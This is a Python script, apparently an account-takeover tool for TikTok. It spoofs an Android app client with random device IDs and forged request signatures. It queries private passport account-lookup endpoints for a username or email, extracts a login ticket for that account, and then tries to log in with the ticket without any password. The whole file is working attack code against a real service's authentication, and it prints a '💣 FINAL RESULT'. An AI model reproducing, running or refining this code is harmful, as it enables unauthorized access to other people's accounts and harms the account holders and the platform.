import requests
import time
import uuid
import random
import secrets
import SignerPy


class UltraTikTok:
    def __init__(self, account_param):
        self.input = account_param.strip()
        self.session = requests.Session()

        self.hosts = [
            "api31-normal-useast2a.tiktokv.com",
            "api22-normal-c-alisg.tiktokv.com",
            "api19-normal-c-useast1a.musical.ly",
            "api31-normal-alisg.tiktokv.com",
            "api16-normal-useast5.tiktokv.us"
        ]

        self.base_params = {
            'device_platform': 'android',
            'channel': 'googleplay',
            'aid': '1233',
            'app_name': 'musical_ly',
            'version_code': '360505',
            'version_name': '36.5.5',
            'manifest_version_code': '2023605050',
            'update_version_code': '2023605050',
            'os_version': '10',
            "device_id": random.randint(1000000000, 9999999999),
            'ac': 'wifi'
        }

        self.headers = {
            'User-Agent': f'com.zhiliaoapp.musically/{self.base_params["manifest_version_code"]} (Linux; Android 10)',
            "Connection": "close"
        }

    def variants(self):
        return list(set([
            self.input,
            self.input.lower(),
            self.input.strip()
        ]))

    def safe_request(self, url, params, headers):
        try:
            r = self.session.post(url, params=params, headers=headers, timeout=(5, 15))

            print("\n🌐 RESPONSE INFO")
            print("STATUS:", r.status_code)
            print("HEADERS:", dict(r.headers))
            print("BODY:", r.text[:500])

            try:
                return r.json()
            except:
                return None

        except Exception as e:
            print("❌ Request error:", e)
            return None

    def try_endpoint(self, endpoint):
        for acct in self.variants():
            for host in self.hosts:

                url = f"https://{host}{endpoint}"

                params = self.base_params.copy()
                ts = int(time.time())

                params.update({
                    "account_param": acct,
                    "ts": ts,
                    "_rticket": int(ts * 1000)
                })

                try:
                    sig = SignerPy.sign(params=params)
                except:
                    continue

                headers = self.headers.copy()
                headers.update({
                    'x-tt-passport-csrf-token': secrets.token_hex(16),
                    'x-ss-req-ticket': sig.get('x-ss-req-ticket', ''),
                    'x-ss-stub': sig.get('x-ss-stub', '')
                })

                data = self.safe_request(url, params, headers)

                if not data:
                    continue

                accounts = data.get("data", {}).get("accounts", [])
                if not accounts:
                    continue

                acc = accounts[0]

                ticket = acc.get("passport_ticket") or acc.get("not_login_ticket")
                username = acc.get("username") or acc.get("user_name")

                if ticket:
                    print("✅ Ticket found")
                    return {
                        "username": username,
                        "ticket": ticket,
                        "raw": data
                    }

        return None

    def login_with_ticket(self, ticket):
        url = "https://api19-normal-c-alisg.tiktokv.com/passport/user/login_by_passport_ticket/"

        params = {
            "passport_ticket": ticket,
            "device_platform": "android",
            "channel": "googleplay",
            "aid": "1233",
            "app_name": "musical_ly",
            "ts": int(time.time())
        }

        return self.safe_request(url, params, self.headers)

    def run(self):
        res = self.try_endpoint("/passport/account_lookup/username/")
        if not res:
            res = self.try_endpoint("/passport/account_lookup/email/")

        if not res:
            return {"status": "failed"}

        ticket = res.get("ticket")

        if not ticket:
            return {"status": "no_ticket"}

        print("\n🚀 Trying login...")

        time.sleep(5)  # تهدئة الطلب

        login_res = self.login_with_ticket(ticket)

        return {
            "status": "success",
            "lookup": res,
            "login": login_res
        }


if __name__ == "__main__":
    inp = input("Enter (username/email): ")

    engine = UltraTikTok(inp)
    result = engine.run()

    print("\n💣 FINAL RESULT:\n")
    print(result)
